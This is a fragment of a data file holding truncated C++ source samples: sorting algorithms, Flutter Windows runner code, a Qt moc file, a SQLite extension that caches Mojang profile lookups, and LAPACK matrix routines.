bArr[j++];\r\n\t}\r\n\twhile (i < alen)\r\n\t{\r\n\t\ttemp[k++] = aArr[i++];\r\n\t}\r\n\twhile (j < blen)\r\n\t{\r\n\t\ttemp[k++] = bArr[j++];\r\n\t}\r\n}\r\n\r\n//\u65e0\u5e8f\u5e8f\u5217\uff0c\u5c06\u5176\u62c6\u5206\u5f00\uff0c\u8ba9\u5176\u6210\u4e3a\u6709\u5e8f\u7684\u591a\u4e2a\u5e8f\u5217\r\nvoid merge(int arr[], int low, int mid, int higth, int* temp) {\r\n\tint i = low;\r\n\tint j = mid + 1;\r\n\tint k = low;\r\n\twhile (i <= mid && j <= higth)\r\n\t{\r\n\t\ttemp[k++] = arr[i] < arr[j] ? arr[i++] : arr[j++];\r\n\t}\r\n\twhile (i <= mid) {\r\n\t\ttemp[k++] = arr[i++];\r\n\t}\r\n\twhile (j <= higth) {\r\n\t\ttemp[k++] = arr[j++];\r\n\t}\r\n\tfor (i = low; i <= higth; i++) {\r\n\t\tarr[i] = temp[i];\r\n\t}\r\n}\r\n\r\nvoid merge_sort(int arr[], int low, int higth, int* temp) {\r\n\tif (low >= higth) {\r\n\t\treturn;\r\n\t}\r\n\tint mid = low + (higth - low) / 2;//(low+higth)/2;\r\n\tmerge_sort(arr, low, mid, temp);\r\n\tmerge_sort(arr, mid + 1, higth, temp);\r\n\tmerge(arr, low, mid, higth, temp);\r\n}\r\n\r\nvoid mergesort2(int arr[], int length) {\r\n\tint* temp = new int[length];\r\n\tassert(temp);\r\n\tmerge_sort(arr, 0, length - 1, temp);\r\n\tdelete[] temp;\r\n}\r\n\r\n//\u5165\u5806\uff08\u5185\u5806\uff09\r\nvoid pushHeap(int* heap, int& size, int data) {\r\n\theap[size] = data;\r\n\tint current = size;\r\n\tint parent = (current - 1) / 2;\r\n\twhile (current > 0 && heap[current] < heap[parent]) {\r\n\t\tswap(heap[current], heap[parent]);\r\n\t\tcurrent = parent;\r\n\t\tparent = (current - 1) / 2;\r\n\t}\r\n\tsize++;\r\n}\r\n\r\n//\u51fa\u5806\uff08\u5185\u5806\uff09\r\nint popHeap(int* heap, int& size) {\r\n\tint val = heap[0];\r\n\theap[0] = heap[size - 1];\r\n\tsize--;\r\n\tint current = 0;\r\n\tint child = 2 * current + 1;\r\n\twhile (child < size) {\r\n\t\tif (child + 1 < size && heap[child + 1] < heap[child])\r\n\t\t\tchild++;\r\n\t\tif (heap[child] >= heap[current])\r\n\t\t\tbreak;\r\n\t\tswap(heap[child], heap[current]);\r\n\t\tcurrent = child;\r\n\t\tchild = 2 * current + 1;\r\n\t}\r\n\treturn val;\r\n}\r\n\r\n//\u5806\u6392\u5e8f\u5b9e\u73b0\uff08\u5185\u5806\uff09\r\nvoid heapsort1(int* arr, int length) {\r\n\tint* heap = new int[length];\r\n\tint heapSize = 0;\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tpushHeap(heap, heapSize, arr[i]);\r\n\t}\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tarr[i] = popHeap(heap, heapSize);\r\n\t}\r\n\tdelete[] heap;\r\n}\r\n\r\n// \u8c03\u6574\u5806\uff08\u5916\u5806\uff09\r\nvoid heapify(int arr[], int n, int i) {\r\n\tint largest = i;  // \u521d\u59cb\u5316\u6700\u5927\u5143\u7d20\u4e3a\u6839\u8282\u70b9\r\n\tint left = 2 * i + 1;  // \u5de6\u5b50\u8282\u70b9\u7684\u7d22\u5f15\r\n\tint right = 2 * i + 2;  // \u53f3\u5b50\u8282\u70b9\u7684\u7d22\u5f15\r\n\r\n\t// \u5982\u679c\u5de6\u5b50\u8282\u70b9\u5927\u4e8e\u6839\u8282\u70b9\r\n\tif (left < n && arr[left] > arr[largest]) {\r\n\t\tlargest = left;\r\n\t}\r\n\r\n\t// \u5982\u679c\u53f3\u5b50\u8282\u70b9\u5927\u4e8e\u5f53\u524d\u6700\u5927\u8282\u70b9\r\n\tif (right < n && arr[right] > arr[largest]) {\r\n\t\tlargest = right;\r\n\t}\r\n\r\n\t// \u5982\u679c\u6700\u5927\u8282\u70b9\u4e0d\u662f\u6839\u8282\u70b9\r\n\tif (largest != i) {\r\n\t\tswap(arr[i], arr[largest]);\r\n\t\t// \u9012\u5f52\u8c03\u6574\u5b50\u6811\r\n\t\theapify(arr, n, largest);\r\n\t}\r\n}\r\n\r\n// \u5806\u6392\u5e8f\uff08\u5916\u5806\uff09\r\nvoid heapSort(int arr[], int n) {\r\n\t// \u6784\u5efa\u6700\u5927\u5806\uff08\u4ece\u6700\u540e\u4e00\u4e2a\u975e\u53f6\u5b50\u8282\u70b9\u5f00\u59cb\uff09\r\n\tfor (int i = n / 2 - 1; i >= 0; i--) {\r\n\t\theapify(arr, n, i);\r\n\t}\r\n\r\n\t// \u9010\u4e2a\u4ece\u5806\u9876\u53d6\u51fa\u5143\u7d20\uff0c\u653e\u5230\u5df2\u6392\u5e8f\u533a\u95f4\u672b\u5c3e\r\n\tfor (int i = n - 1; i > ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/****************************************************************************\n** Meta object code from reading C++ file 'xemlichsu.h'\n**\n** Created by: The Qt Meta Object Compiler version 68 (Qt 6.2.4)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include <memory>\n#include \"../../../../IC Tester/IC_Tester/include/xemlichsu.h\"\n#include <QtCore/qbytearray.h>\n#include <QtCore/qmetatype.h>\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'xemlichsu.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 68\n#error \"This file was generated using the moc from 6.2.4. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\nQT_BEGIN_MOC_NAMESPACE\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nstruct qt_meta_stringdata_XemLichSu_t {\n    const uint offsetsAndSize[2];\n    char stringdata0[10];\n};\n#define QT_MOC_LITERAL(ofs, len) \\\n    uint(offsetof(qt_meta_stringdata_XemLichSu_t, stringdata0) + ofs), len \nstatic const qt_meta_stringdata_XemLichSu_t qt_meta_stringdata_XemLichSu = {\n    {\nQT_MOC_LITERAL(0, 9) // \"XemLichSu\"\n\n    },\n    \"XemLichSu\"\n};\n#undef QT_MOC_LITERAL\n\nstatic const uint qt_meta_data_XemLichSu[] = {\n\n // content:\n      10,       // revision\n       0,       // classname\n       0,    0, // classinfo\n       0,    0, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       0,       // signalCount\n\n       0        // eod\n};\n\nvoid XemLichSu::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    (void)_o;\n    (void)_id;\n    (void)_c;\n    (void)_a;\n}\n\nconst QMetaObject XemLichSu::staticMetaObject = { {\n    QMetaObject::SuperData::link<QWidget::staticMetaObject>(),\n    qt_meta_stringdata_XemLichSu.offsetsAndSize,\n    qt_meta_data_XemLichSu,\n    qt_static_metacall,\n    nullptr,\nqt_incomplete_metaTypeArray<qt_meta_stringdata_XemLichSu_t\n, QtPrivate::TypeAndForceComplete<XemLichSu, std::true_type>\n\n\n\n>,\n    nullptr\n} };\n\n\nconst QMetaObject *XemLichSu::metaObject() const\n{\n    return QObject::d_ptr->metaObject ? QObject::d_ptr->dynamicMetaObject() : &staticMetaObject;\n}\n\nvoid *XemLichSu::qt_metacast(const char *_clname)\n{\n    if (!_clname) return nullptr;\n    if (!strcmp(_clname, qt_meta_stringdata_XemLichSu.stringdata0))\n        return static_cast<void*>(this);\n    return QWidget::qt_metacast(_clname);\n}\n\nint XemLichSu::qt_metacall(QMetaObject::Call _c, int _id, void **_a)\n{\n    _id = QWidget::qt_metacall(_c, _id, _a);\n    return _id;\n}\nQT_WARNING_POP\nQT_END_MOC_NAMESPACE\n",
    "#include <cstdio>\n#include <cassert>\n#include <cstdint>\n#include <chrono>\n#include <cstring>\n#include <string_view>\n\n#include <curl/curl.h>\n#include <json-c/json.h>\n\n#include <sqlite3ext.h> /* Do not use <sqlite3.h>! */\nSQLITE_EXTENSION_INIT1\n\nbool isValidHexChar(char c) {\n    return ((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F'));\n}\n\nstd::optional<std::string> normalize_uuid(std::string_view uuid) {\n    std::string out;\n    out.reserve(36);\n    int hyphens = 0;\n    int hex_chars = 0;\n    for (char c : uuid) {\n        if (c == '-') {\n            hyphens++;\n            if (hyphens > 4) return {}; // Too many hyphens\n        }\n        else if (isValidHexChar(c)) {\n            hex_chars++;\n            if (hex_chars > 32) return {}; // Too many hex chars\n            out.push_back(tolower(c));\n            if (hex_chars == 8 || hex_chars == 12 || hex_chars == 16 || hex_chars == 20) {\n                out.push_back('-');\n            }\n        } else {\n            return {}; // invalid uuid\n        }\n    }\n    if (hex_chars < 32) return {};\n    return out;\n}\n\nstruct Profile {\n    std::string uuid;\n    std::string name;\n};\n\nstd::optional<Profile> parse_profile(const char* json_str) {\n    json_object *json = json_tokener_parse(json_str);\n    json_object *name_obj{};\n    json_object *id_obj{};\n    if (json_object_object_get_ex(json, \"name\", &name_obj) && json_object_object_get_ex(json, \"id\", &id_obj)) {\n        // if not valid uuid this throws exception\n        auto normal_uuid = normalize_uuid(json_object_get_string(id_obj)).value();\n        return {Profile{\n            .uuid = std::move(normal_uuid),\n            .name = json_object_get_string(name_obj),\n        }};\n    }\n    return {};\n}\n\nsize_t write_callback(char* data, size_t size, size_t nmemb, std::string* str) {\n    str->append(data, size * nmemb);\n    return size * nmemb;\n}\n\nstd::optional<Profile> fetch_profile(const char* url, std::string* error_out) {\n    CURL *curl = curl_easy_init();\n    assert(curl);\n    curl_easy_setopt(curl, CURLOPT_URL, url);\n    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);\n    std::string response;\n    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);\n    char error[CURL_ERROR_SIZE];\n    curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, &error);\n    CURLcode res = curl_easy_perform(curl);\n    long http_code;\n    curl_easy_getinfo (curl, CURLINFO_RESPONSE_CODE, &http_code);\n    if (res != CURLE_OK) {\n        *error_out = error;\n        return {};\n    } else if (http_code == 200) {\n        return parse_profile(response.c_str());\n    } else {\n        *error_out = \"Mojang API returned http code \" + std::to_string(http_code);\n        return {};\n    }\n}\n\nstd::optional<Profile> fetch_profile_by_uuid(const char* uuid, std::string* error) {\n    std::string url = std::string{\"https://sessionserver.mojang.com/session/minecraft/profile/\"} + uuid;\n    return fetch_profile(url.c_str(), error);\n}\n\nstd::optional<Profile> fetch_profile_by_name(const char* name, std::string* error) {\n    std::string url = std::string{\"https://api.mojang.com/users/profiles/minecraft/\"} + name;\n    return fetch_profile(url.c_str(), error);\n}\n\nvoid update_cache(sqlite3* db, const char* uuid, const char* name, int64_t created_at) {\n    const char *sql = \"INSERT OR REPLACE INTO mc_profile_cache(uuid, name, created_at) VALUES(?, ?, ?)\";\n    sqlite3_stmt *stmt;\n    sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);\n    sqlite3_bind_text(stmt, 1, uuid, -1, SQLITE_TRANSIENT);\n    sqlite3_bind_text(stmt, 2, name, -1, SQLITE_TRANSIENT);\n    sqlite3_bind_int64(stmt, 3, created_at);\n    sqlite3_step(stmt);\n    sqlite3_finalize(stmt);\n}\n\nvoid lookup0(sqlite3_context* ctx, const char* argument, bool uuid) {\n    sqlite3* db = sqlite3_context_db_handle(ctx);\n\n    auto fetch = uuid ? fetch_profile_by_uuid : fetch_profile_by_name;\n    const char *sql = uuid ?\n            \"SELECT name,uuid,created_at FROM mc_profile_cache WHERE uuid = ?\"\n            : \"SELECT name,uuid,created_at FROM mc_profile_cache WHERE name = ?\";\n    sqlite3_stmt *stmt;\n    sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);\n    sqlite3_bind_text(stmt, 1, argument, -1, SQLITE_TRANSIENT);\n\n    int64_t now = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();\n    constexpr int64_t millis_in_hour = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::hours{1}).count();\n    // Execute SQL statement\n    int err = sqlite3_step(stmt);\n    if (err == SQLITE_ROW) {\n        auto cached_name = (const char*) sqlite3_column_text(stmt, 0);\n        auto cached_uuid = (const char*) sqlite3_column_text(stmt, 1);\n        auto cached_result = uuid ? cached_name : cached_uuid;\n        int64_t created_at = sqlite3_column_int64(stmt, 2);\n        if (now - created_at < millis_in_hour) {\n            sqlite3_result_text(ctx, cached_result, strlen(cached_result), SQLITE_TRANSIENT);\n        } else {\n            std::string erro",
    "#include <iostream>\n#include <iomanip>\n#include <cmath>\n#include <cstring>\n#include <chrono>\n\n// compile + run:\n// g++ main.cpp -lopenblas -llapack && ./a.out\n\nextern \"C\" { // Multiply matrixes\n    extern int dgemm_(char *, char *, unsigned int *, unsigned int *, unsigned int *, double *, \n                    double *, unsigned int *, double *, unsigned int *, double *, double *, unsigned int *);\n}\n\nextern \"C\" { // QR DECOMPOSITION\n    extern int dgeqrf_(unsigned int *, unsigned int *, double *, unsigned int *, double *, double *, int *, int *);\n}\n\nextern \"C\" { // COPY VECTOR\n    extern int dcopy_(unsigned int *, double *, int *, double *, int *);\n}\n\nextern \"C\" { // Compute matrix Q in QR\n    extern int dorgqr_(unsigned int *, unsigned int *, unsigned int *, double *, unsigned int *, double *, double *, int *, int *);\n}\n\nextern \"C\" { // PIVOTING QR DECOMPOSITION\n    extern int dgeqp3_(unsigned int *, unsigned int *, double *, unsigned int *, int *, double *, double *, int *, int *);\n}\n\nextern \"C\" { // LU FACTORIZATION\n    extern int dgetrf_(unsigned int *, unsigned int *, double *, unsigned int *, int *, int *);\n}\n\nextern \"C\" { // SOLVING LINEAR SYSTEM\n    extern int dgetrs_(char *, unsigned int *, unsigned int *, double *, unsigned int *, int *, double *, unsigned int *, int *);\n}\n\nextern \"C\" { // SWAP COLUMNS\n    extern int dswap_(unsigned int *, double *, int *, double *, int *);\n}\n\n\ndouble * fill_in_x(unsigned int n, unsigned int s)\n{\n    double * x = new double[n * s];\n    for(int i = 0; i < n * s; i++) x[i] = 0;\n\n    return x;\n}\n\ndouble * fill_in_b(unsigned int n, unsigned int s)\n{\n    double * b = new double [n * s];\n    for (int i = 0; i < n; ++i){\n        for(int j = 0; j < s; ++j) {\n            b[j * n + i] = (j + i) % n + 1;\n        }\n    }\n    return b;\n}\n\ndouble * fill_in_A(unsigned int n)\n{\n    double * A = new double [n * n];\n    for (int i = 0; i < n; ++i) {\n        A[i * n + i] = 4;\n        if (i + 1 < n) {\n            A[i * n + i + 1] = -1;\n            A[(i + 1) * n + i] = -1;\n        }\n    }\n    return A;\n}\n\n\nvoid print_matrix(double * ary, unsigned int n, unsigned int s, int dist = 15) \n{\n    std::cout << std::endl << std::setw(dist);\n    for(int i = 0; i < n; i++) {\n        \n        for(int j = 0; j < s; j++) {\n            std::cout  << ary[j * n + i] << std::setw(dist);\n        }\n        std::cout << std::endl;\n    }\n    std::cout << std::endl;\n}\n\n\nunsigned int orth(double * p, double * q, double * r, unsigned int n, unsigned int s, double eps)\n{\n/*\nHOW FUNCTION WORKS:\n1) P = QR (QR decomposition for matrix P)\n2) R = Q1 * R1 * P1 (QR decomposition with pivoting for matrix R, P1 is the permutation matrix)\n3) Searching index of element in main diagonal of matrix R1, which less than eps. Let that index is equal cur_rank\n4) Result matrix is equal to product of matrixes: P = Q * Q2, where matrix Q2 contains first cur_rank columns of matrix Q1\n*/\n\n    for(int i = 0; i < s * s; i++) {\n        r[i] = 0;\n    }\n\n    int inc = 1;\n    unsigned int size = n * s;\n    dcopy_(&size, p, &inc, q, &inc);\n\n\n    int lwork = 3 * n + 1;\n    double * work = new double[3 * n + 1];\n    double * tau = new double [n];\n    int info = 1;\n\n    dgeqrf_(&n, &s, q, &n, tau, work, &lwork, &info);   // P = QR\n\n    // filling R\n    for(int i = 0; i < s; i++) {                         \n        for(int j = i; j < s; j++) {\n            r[j * s + i] = q[j * n + i];\n        }\n    }\n    \n    dorgqr_(&n, &s, &s, q, &n, tau, work, &lwork, &info); // compute Q for P = QR\n\n    int * jpvt = new int[s];\n    dgeqp3_(&s, &s, r, &s, jpvt, tau, work, &lwork, &info); // pivoting QR for R\n\n    unsigned int cur_rank = s;\n    for(int i = 0 ; i < s; ++i) {\n        if (std::abs(r[i * s + i]) < eps) {\n            cur_rank = i;\n            break;\n        }\n    }\n    if (cur_rank == 0) {\n        return 0;\n    }\n\n    dorgqr_(&s, &s, &s, r, &s, tau, work, &lwork, &info); // compute Q in R = QR\n\n    char trans = 'N'; double alph = 1.0; double bet = 0.0;\n    dgemm_(&trans, &trans, &n, &cur_rank, &s, &alph, q, &n, r, &s, &bet, p, &n);\n    return cur_rank;\n    \n}\n\n\ndouble cheb_norm(double * r, int col, unsigned int n)\n{\n    double max = 0.0;\n    for(int i = 0; i < n; ++i) {\n        if(std::abs(r[col * n + i]) > max) max = std::abs(r[col * n + i]);\n    }\n    return max;\n}\n\nvoid swap_cols(double * x, double * r, int i, unsigned int j, int * swaps, unsigned int n, unsigned int s)\n{\n// Swapping i-th and j-th columns of matrixes X and R\n    int inc = 1;\n    dswap_(&n, &r[i * n], &inc, &r[j * n], &inc);\n    dswap_(&n, &x[i * n], &inc, &x[j * n], &inc);\n    if(j != 0) {\n        unsigned int t = swaps[i];\n        swaps[i] = swaps[j];\n        swaps[j] = t;\n    }\n\n}\n\nvoid swap_back(double * x, int * swaps, unsigned int n, unsigned int s)\n{\n// swaps: (example)\n// [3 1 4 2] -> [4 1 3 2] -> [2 1 3 4] -> [1 2 3 4]\n    int inc = 1;\n    for(unsigned int i = 1; i <= s; ++i) {\n        if(swaps[i - 1] != i - 1) {\n            dswap_(&n, &x[(i - 1) * n], &inc, &x[swaps[i -",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"voicebasedemail\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
